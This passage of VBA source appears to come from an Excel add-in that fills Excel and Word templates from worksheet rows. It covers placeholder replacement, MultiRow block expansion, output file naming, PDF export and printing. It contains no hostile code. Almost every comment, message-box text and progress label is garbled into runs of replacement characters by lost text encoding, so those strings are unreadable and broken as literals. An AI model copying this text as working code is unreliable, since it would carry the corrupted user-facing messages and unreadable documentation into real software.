    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ra
    On Error Resume Next: Dim en&: en& = Err.Number
    If ra.Worksheet.ProtectContents Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim cell As Range
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each cell In Intersect(ra, ra.Worksheet.UsedRange).Cells
            If Trim(cell.value) <> "" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If SpecialCells_TypeConstants Is Nothing Then
                    Set SpecialCells_TypeConstants = cell
                Else
                    Set SpecialCells_TypeConstants = Union(SpecialCells_TypeConstants, cell)
                End If
            End If
        Next cell

    Else        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel
        Set SpecialCells_TypeConstants = ra.SpecialCells(xlCellTypeConstants)
    End If
    If en& = 0 Then Err.Clear
End Function

Function SpecialCells_VisibleRows(ByRef ra As Range) As Range
    On Error Resume Next: Dim en&: en& = Err.Number
    If ra.Worksheet.ProtectContents Then
        Dim ro As Range
        For Each ro In Intersect(ra, ra.Worksheet.UsedRange.EntireRow).Rows
            If ro.EntireRow.Hidden = False Then
                If SpecialCells_VisibleRows Is Nothing Then
                    Set SpecialCells_VisibleRows = ro
                Else
                    Set SpecialCells_VisibleRows = Union(SpecialCells_VisibleRows, ro)
                End If
            End If
        Next ro
    Else
        Set SpecialCells_VisibleRows = ra.SpecialCells(xlCellTypeVisible)
    End If
    If en& = 0 Then Err.Clear
End Function

Function RenderString(ByVal txt$, ByRef options As Dictionary) As String
    On Error Resume Next: Dim arr, i&: arr = options.Keys
    For i = LBound(arr) To UBound(arr)
        txt$ = Replace(txt$, arr(i), options(arr(i)))
    Next i
    RenderString = txt$
End Function

Function CreatePathForFile(ByVal OldFilename$, ByRef options As Dictionary) As String
    On Error Resume Next: Err.Clear
    Dim Mask$, ShortOldFilename$, subfolder$, filename$, pcc&, NewFolderPath$, NewFilename$

    Mask$ = SETT.GetText("TextBox_OutputMask")        ' f.e., {str} - {filename}.{ext}

    ShortOldFilename$ = Replace(OldFilename$, TEMPLATES_FOLDER$, "")

    subfolder$ = Left(ShortOldFilename$, InStrRev(ShortOldFilename$, "\") - 1)
    If Len(subfolder$) Then subfolder$ = subfolder$ & "\"

    filename$ = Dir(OldFilename$)
    filename$ = Left(filename$, InStrRev(filename$, ".") - 1)

    If filename$ Like "*{print=#*}*" Then
        pcc& = Val(Split(filename$, "{print=")(1))
        filename$ = Replace(filename$, "{print=" & pcc& & "}", "")
        options("{%pcc%}") = pcc&
    End If
    If filename$ Like "*{pdf}*" Then
        filename$ = Replace(filename$, "{pdf}", "")
        options("{%pdf%}") = 1
    End If

    options("{%filename%}") = RenderString(filename$, options)
    options("{%ext%}") = GetExtensionForNewFile(ShortOldFilename$)

    NewFilename$ = OUTPUT_FOLDER$ & subfolder$ & FWF.Replace_symbols(RenderString(Mask$, options), , True)

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    NewFolderPath$ = Left(NewFilename$, InStrRev(NewFilename$, "\"))
    If Len(Dir(NewFolderPath$, vbDirectory)) = 0 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        SHCreateDirectoryEx Application.Hwnd, NewFolderPath$, ByVal 0&        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    End If

    If Val(Application.Version) > 11 And (SETT.GetBoolean("CheckBox_PDF") Or (Val(options("{%pdf%}")) = 1)) Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
        If TemplateType(OldFilename$) <> "TXT" Then
            NewFilename$ = Left(NewFilename$, InStrRev(NewFilename$, ".") - 1) & ".pdf"
        End If
    End If

    CreatePathForFile = NewFilename$
End Function

Function GetExtensionForNewFile(ByVal filename$)
    On Error Resume Next: Err.Clear
    Select Case FWF.GetFileExtension(filename$)
        Case "XLT": GetExtensionForNewFile = "XLS"
        Case "XLTM": GetExtensionForNewFile = "XLSM"
        Case "XLTX": GetExtensionForNewFile = "XLSX"
        Case "DOT": GetExtensionForNewFile = "DOC"
        Case "DOTM": GetExtensionForNewFile = "DOCM"
        Case "DOTX": GetExtensionForNewFile = "DOCX"
        Case "DOCXML": GetExtensionForNewFile = "XML"

        Case Else: GetExtensionForNewFile = FWF.GetFileExtension(filename$)
    End Select
End Function

Function GetFileFormatForNewFile(ByVal filename$) As Long
    On Error Resume Next: Err.Clear
    Select Case FWF.GetFileExtension(filename$)
        Case "CSV": GetFileFormatForNewFile = xlCSV
        Case "XLS": GetFileFormatForNewFile = xlWorkbookNormal
        Case "XLSM": GetFileFormatForNewFile = 52        ' xlOpenXMLWorkbookMacroEnabled
        Case "XLSX": GetFileFormatForNewFile = 51        ' xlOpenXMLWorkbook
        Case "DOC": GetFileFormatForNewFile = 0        ' wdFormatDocument
        Case "DOCM": GetFileFormatForNewFile = 13        ' wdFormatXMLDocumentMacroEnabled
        Case "DOCX": GetFileFormatForNewFile = 12        ' wdFormatXMLDocument
        Case "XML": GetFileFormatForNewFile = 19        ' wdFormatFlatXML (XML)
            ' Case "XML": GetFileFormatForNewFile = 11        ' wdFormatXML (XML 2003)
    End Select
End Function


Function CollectionOfRowsBlocks(ByRef ra As Range) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ra, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ComboBox_Multirow_GroupColumn |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    Set CollectionOfRowsBlocks = New Collection
    Dim cell As Range, coll As New Collection, txt$, block As Range, col&, msg$, v

    If SETT.GetBoolean("CheckBox_Multirow_GroupRows") Then
        col& = SETT.GetNumber("ComboBox_Multirow_GroupColumn")
        If col& = 0 Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|MiltiRow|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
            MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            F_Settings.MultiPage_Options.value = 4
            F_Settings.ComboBox_Multirow_GroupColumn.SetFocus
            F_Settings.ComboBox_Multirow_GroupColumn.BackColor = vbRed
            Exit Function
        End If

        For Each cell In Intersect(ra.EntireRow, ra.Worksheet.Columns(col&)).Cells
            txt$ = Trim(cell): If Len(txt$) Then coll.Add txt$, txt$
        Next cell

        If coll.Count = 0 Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|MiltiRow|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: |fffd|" & col& & "|fffd|" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
            MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            F_Settings.MultiPage_Options.value = 4
            F_Settings.ComboBox_Multirow_GroupColumn.SetFocus
            F_Settings.ComboBox_Multirow_GroupColumn.BackColor = vbRed
            Exit Function
        End If

        For Each v In coll
            Set block = Nothing
            For Each cell In Intersect(ra.EntireRow, ra.Worksheet.Columns(col&)).Cells
                If Trim(cell) = v Then
                    If block Is Nothing Then Set block = cell Else Set block = Union(block, cell)
                End If
            Next cell
            If block Is Nothing Then
                MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Multirow", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Exit Function
            Else
                CollectionOfRowsBlocks.Add block.EntireRow
            End If
        Next v

    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        CollectionOfRowsBlocks.Add ra
    End If
End Function

Function FillInThisWorksheet(ByRef sh As Worksheet) As Boolean
    On Error Resume Next: FillInThisWorksheet = True: Dim NamesList$
    If Not SETT.GetBoolean("CheckBox_SpecifiedTemplateWorksheets") Then Exit Function
    NamesList$ = Replace(SETT.GetText("TextBox_SpecifiedTemplateWorksheets"), " ", "")
    If NamesList$ = "" Then Exit Function
    FillInThisWorksheet = "," & NamesList$ & "," Like "*," & Replace(sh.Name, " ", "") & ",*"
End Function

Function CreateAndFill_XLS(ByVal TemplateFilename$, ByVal NewFilename$, _
                           ByRef AllOptions As Dictionary, Optional ByRef pi As ProgressIndicator) As Boolean

    On Error Resume Next: Err.Clear
    Dim WB As Workbook, sh As Worksheet, nam As Name, ra As Range, calc As XlCalculation, i&, txt_Line2$, options As Dictionary
    pi.Line3 = "|fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    calc = Application.Calculation
    Application.Calculation = xlCalculationManual
    Application.DisplayAlerts = False

    If TemplateType(TemplateFilename$) Like "*template*" Then
        pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
        Set WB = Application.Workbooks.Add(TemplateFilename$)
    Else
        pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel ..."
        Set WB = Application.Workbooks.Open(TemplateFilename$, False, True)
    End If

    '  Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|? " & Not (WB Is Nothing)

    If SETT.GetBoolean("CheckBox_ReplaceExistingFieldCodesOnly") Then
        Set options = GetTemplateOptions(AllOptions, LoadFieldCodes_ExcelWorkbook(WB))
    Else
        Set options = AllOptions
    End If


    If SETT.GetBoolean("CheckBox_MultiRow") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim rc&: rc = Val(AllOptions("{%rc%}"))
        If rc& = 0 Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel: rc& = 0": Exit Function
        pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & rc& & " |fffd||fffd|.) - |fffd||fffd||fffd||fffd||fffd| MULTIROW ..."

        For Each nam In WB.Names
            If nam.Name Like "MultiRow*" Then
                Set ra = Nothing: Set ra = nam.RefersToRange.EntireRow
                'Debug.Print  nam.Name, ra.Address
                If (Not ra Is Nothing) And FillInThisWorksheet(ra.Worksheet) Then
                    If ra.Rows.Count <= 100 Then
                        For i = 1 To rc&
                            ra.Offset(i * ra.Rows.Count).Insert Shift:=xlDown
                            ra.Copy ra.Offset(i * ra.Rows.Count)
                            ra.Offset(i * ra.Rows.Count).Replace "#}", "#" & i & "}", xlPart
                            ra.Offset(i * ra.Rows.Count).Replace "{%index%}", i, xlPart
                        Next i
                        ra.EntireRow.Delete
                    End If
                End If
            End If
        Next
    End If

    txt_Line2$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.line2 = txt_Line2$

    Dim RIC As Boolean, arr, key$, txt As Variant, File_Format
    arr = options.Keys

    RIC = SETT.GetBoolean("CheckBox_ReplaceInColon")

    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt = options(arr(i))

        For Each sh In WB.Worksheets
            If FillInThisWorksheet(sh) Then
                If HasLinkToObject(txt, key$) Then
                    InsertObjectIntoXLS sh, txt, key$, pi
                    Err.Clear
                Else
                    sh.UsedRange.Replace key$, txt, xlPart, , False
                    'Debug.Print VarType(txt), TypeName(txt), txt

                    If RIC Then
                        With sh.PageSetup
                            .LeftFooter = Replace(.LeftFooter, key$, txt, , , vbTextCompare)
                            .LeftHeader = Replace(.LeftHeader, key$, txt, , , vbTextCompare)
                            .CenterFooter = Replace(.CenterFooter, key$, txt, , , vbTextCompare)
                            .CenterHeader = Replace(.CenterHeader, key$, txt, , , vbTextCompare)
                            .RightFooter = Replace(.RightFooter, key$, txt, , , vbTextCompare)
                            .RightHeader = Replace(.RightHeader, key$, txt, , , vbTextCompare)
                        End With
                    End If
                End If
            End If
        Next sh

        If i Mod IIf(RIC, 5, 30) = 0 Then
            pi.line2 = txt_Line2$ & "  (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Format(i / UBound(arr), "0%") & ")"
        End If
        DoEvents
    Next i

    pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd| ..."
    For Each sh In WB.Worksheets
        If FillInThisWorksheet(sh) Then
            sh.Calculate
            If SETT.GetBoolean("CheckBox_FormulasToValues") Then sh.UsedRange.value = sh.UsedRange.value
        End If
    Next sh

    Application.Run "'" & WB.Name & "'!FillDone"

    pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Split(NewFilename$, "\")(UBound(Split(NewFilename$, "\")))
    Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Replace(NewFilename$, OUTPUT_FOLDER$, "...\")
    pi.FP.Repaint

    If Val(Application.Version) > 11 And (SETT.GetBoolean("CheckBox_PDF") Or (Val(AllOptions("{%pdf%}")) = 1)) Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
        WB.ExportAsFixedFormat 0, NewFilename$        ' xlTypePDF = 0
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel
        File_Format = GetFileFormatForNewFile(NewFilename$)
        If Len(File_Format) Then
            WB.SaveAs NewFilename$, Val(File_Format)
        Else
            WB.SaveAs NewFilename$
        End If
    End If
    If SETT.GetBoolean("CheckBox_ImmediatePrintOut") Then WB.PrintOut , , PrintCopiesCount(AllOptions)
    WB.Close False

    CreateAndFill_XLS = Err = 0

    Application.Calculation = calc
    Application.DisplayAlerts = True
End Function




Function PrintCopiesCount(ByRef options As Dictionary) As Long
    On Error Resume Next
    Dim en&, PrintCopiesField$, CopiesCount&, pcc As Variant
    en& = Err.Number
    PrintCopiesCount = 1

    PrintCopiesField$ = options("{%PrintCopiesCount%}")
    If PrintCopiesField$ Like "{*?}" Then
        CopiesCount& = Fix(Val(options(PrintCopiesField$)))
    Else
        CopiesCount& = Fix(Val(PrintCopiesField$))
    End If
    If CopiesCount& > 0 Then PrintCopiesCount = CopiesCount&

    pcc = options("{%pcc%}")
    If pcc <> "" Then PrintCopiesCount = Val(pcc)

    If en& = 0 Then Err.Clear        ' Debug.Print "PrintCopiesCount = " & PrintCopiesCount
End Function

Function CreateAndFill_DOC(ByVal TemplateFilename$, ByVal NewFilename$, _
                           ByRef AllOptions As Dictionary, Optional ByRef pi As ProgressIndicator) As Boolean
    On Error Resume Next: Err.Clear
    Dim doc As Object, ecount As Long, bm As Object, myStoryRange As Object, i&, oFirstCellRange As Object, bmText$, options As Dictionary
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    If TemplateType(TemplateFilename$) Like "*template*" Then
        pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
        Set doc = WA.Documents.Add(TemplateFilename$)
    Else
        pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word ..."
        Set doc = WA.Documents.Open(TemplateFilename$, , False, False)
    End If

    If SETT.GetBoolean("CheckBox_ReplaceExistingFieldCodesOnly") Then
        Set options = GetTemplateOptions(AllOptions, LoadFieldCodes_WordDocument(doc))
    Else
        Set options = AllOptions
    End If

    '  Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|? " & Not (doc Is Nothing)
    doc.ActiveWindow.View.ShowFieldCodes = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

    Dim TimeStamp As Double, ProcessTime1$, ProcessTime2$, Mcol&, MColumnTxt$, MColValue$, InlineBookmark As Boolean: TimeStamp = Timer

    If SETT.GetBoolean("CheckBox_MultiRow") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

        TimeStamp = Timer: Dim rc&: rc = Val(AllOptions("{%rc%}"))
        If rc& = 0 Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word: rc& = 0": Exit Function

        '  Dim bm As Bookmark, ra As word.Range, oFirstCellRange As word.Range
        pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MULTIROW) ..."
        For Each bm In doc.Bookmarks
            If bm.Name Like "MultiRow*" Then

                Mcol& = 0: InlineBookmark = False
                If bm.Name Like "*Inline*" Then InlineBookmark = True ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                
                If bm.Name Like "MultiRow*_col?*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    MColumnTxt$ = UCase(Split(bm.Name, "_col")(1))
                    If Val(MColumnTxt$) Then
                        Mcol& = Val(MColumnTxt$)
                    Else
                        If (MColumnTxt$ Like "[A-Z]") Or (MColumnTxt$ Like "[A-Z][A-Z]") Then
                            Mcol& = ThisWorkbook.Worksheets(1).Range(MColumnTxt$ & "1").Column
                        End If
                    End If
                End If
                If Mcol& > 0 Then If rc& <> SourceRows.Rows.Count Then Debug.Print "rc&<>SourceRows.Rows.Count", rc&, SourceRows.Rows.Count

                If (Not InlineBookmark) And bm.Range.Information(12) Then    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    For i = 1 To rc&
                        pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd|" & bm.Name & "|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & i & " |fffd||fffd| " & rc&

                        MColValue$ = "": MColValue$ = Trim(SourceRows.Cells(i, Mcol&).Text)        ' |fffd||fffd||fffd| Multirow |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        If (Mcol& = 0) Or (Len(MColValue$) > 0) Then
                            With bm.Range
                                Set oFirstCellRange = .Cells(1).Range
                                oFirstCellRange.Collapse 1        'wdCollapseStart
                                .Copy
                                '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                oFirstCellRange.PasteAndFormat 16        'wdFormatOriginalFormatting
                                WordReplacements .Tables(1).Rows(.Rows(1).Index).Range, "#}", "#" & i & "}"
                                WordReplacements .Tables(1).Rows(.Rows(1).Index).Range, "{%index%}", i
                                If SETT.GetBoolean("CheckBox_Multirow_InsertPageBreaks") Then
                                    If i > IIf(SETT.GetBoolean("CheckBox_Multirow_InsertPageBreaksAfterSecondRow"), 1, 0) Then
                                        oFirstCellRange.InsertBreak Type:=7        ' wdPageBreak = 7
                                    End If
                                End If
                            End With
                            DoEvents
                        End If
                    Next
                    bm.Range.Rows(1).Delete
                Else
                    bmText$ = bm.Range.Text
                    For i = rc& To 1 Step -1
